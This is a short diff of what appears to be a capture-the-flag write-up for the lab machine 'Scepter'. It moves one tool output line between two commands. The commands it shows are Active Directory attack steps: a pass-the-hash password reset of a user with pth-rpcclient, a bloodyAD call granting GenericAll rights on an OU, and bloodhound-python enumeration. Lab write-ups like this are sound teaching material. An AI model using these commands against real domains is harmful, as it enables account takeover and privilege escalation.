@@ -121,7 +121,6 @@ sudo bloodhound-python    -u 'd.baker'    -d scepter.htb    -k -no-pass    -dc d
 
 ```bash
 pth-rpcclient -U 'SCEPTER\d.baker%aad3b4...:18b5fb...' 10.10.11.65 -c "setuserinfo2 a.carter 23 'NoSecHere!'"
-[+] a.carter has now GenericAll on OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB
 ```
 
 ---
@@ -130,6 +129,7 @@ pth-rpcclient -U 'SCEPTER\d.baker%aad3b4...:18b5fb...' 10.10.11.65 -c "setuserin
 
 ```bash
 bloodyAD -d scepter.htb -u a.carter -p 'NoSecHere!' --host dc01.scepter.htb --dc-ip 10.10.11.65 add genericAll "OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB" a.carter
+[+] a.carter has now GenericAll on OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB
 ```
 
 ---
